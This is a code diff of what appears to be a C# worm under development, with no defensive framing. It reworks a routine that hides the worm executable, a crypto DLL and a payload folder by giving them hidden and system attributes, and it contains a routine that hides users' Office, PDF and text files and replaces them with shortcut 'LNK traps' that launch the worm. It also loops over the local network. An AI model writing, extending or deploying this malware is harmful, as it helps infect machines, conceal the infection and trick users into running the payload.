@@ -183,32 +183,50 @@ class Program
         }
     }
 
+    // --- MODIFIED: Hide ONLY malware files, ignore LNK/DOCs/etc ---
     private static void HideMalwareFiles(string directory)
     {
         try
         {
-            DirectoryInfo dirInfo = new DirectoryInfo(directory);
-            foreach (var file in dirInfo.GetFiles())
-            {
-                string ext = file.Extension.ToLower();
-                if (ext == ".log" || ext == ".txt") continue;
+            // 1. List of specific files to hide in the root directory
+            string[] filesToHide = {
+                WORM_EXE_NAME,
+                SHARED_CRYPTO_DLL,
+                "SharedCrypto.pdb"
+            };
 
-                try { System.IO.File.SetAttributes(file.FullName, FileAttributes.Hidden | FileAttributes.System); } catch { }
+            foreach (string fileName in filesToHide)
+            {
+                string fullPath = Path.Combine(directory, fileName);
+                if (System.IO.File.Exists(fullPath))
+                {
+                    try { System.IO.File.SetAttributes(fullPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
+                }
             }
 
+            // 2. Hide the payload folder and its contents recursively
             string payloadPath = Path.Combine(directory, PAYLOAD_FOLDER_NAME);
             if (Directory.Exists(payloadPath))
             {
                 DirectoryInfo payloadDir = new DirectoryInfo(payloadPath);
+                // Hide the folder itself
                 payloadDir.Attributes = FileAttributes.Hidden | FileAttributes.System;
 
+                // Hide everything inside the payload folder
                 foreach (var file in payloadDir.GetFiles("*", SearchOption.AllDirectories))
                 {
+                    string ext = file.Extension.ToLower();
+                    // Still exclude logs just in case they end up there
+                    if (ext == ".log" || ext == ".txt") continue;
+
                     try { System.IO.File.SetAttributes(file.FullName, FileAttributes.Hidden | FileAttributes.System); } catch { }
                 }
             }
         }
-        catch { }
+        catch (Exception ex)
+        {
+            LogWarning($"Error hiding files: {ex.Message}");
+        }
     }
 
     private static bool CreateScheduledTask(string taskName, string exePath)
@@ -251,7 +269,6 @@ class Program
             LogInfo($"========== LOOP #{scanCount} ==========");
             try
             {
-                // Detailed logging inside this function now
                 InfectCurrentDirectoryWithLNKs();
 
                 string localIP = GetLocalIPAddress();
@@ -290,7 +307,6 @@ class Program
         }
     }
 
-    // --- IMPROVED: Detailed logging for LNK infection ---
     private static void InfectCurrentDirectoryWithLNKs()
     {
         LogInfo("Starting LNK trap generation in current directory...");
@@ -300,11 +316,10 @@ class Program
             string wormPath = Path.Combine(currentDir, WORM_EXE_NAME);
             string[] targetExtensions = { ".docx", ".xlsx", ".pptx", ".pdf", ".txt" };
 
-            // Find all valid candidates
             var filesToInfect = Directory.GetFiles(currentDir)
                 .Where(f => targetExtensions.Contains(Path.GetExtension(f).ToLower()) &&
                              !Path.GetFileName(f).Equals(Path.GetFileName(logFilePath), StringComparison.OrdinalIgnoreCase))
-                .ToList(); // Materialize list to get count
+                .ToList();
 
             int totalCandidates = filesToInfect.Count;
             if (totalCandidates == 0)
@@ -325,7 +340,6 @@ class Program
                     continue;
                 }
 
-                // Hide original file
                 System.IO.File.SetAttributes(filePath, FileAttributes.Hidden);
 
                 WshShell shell = new WshShell();
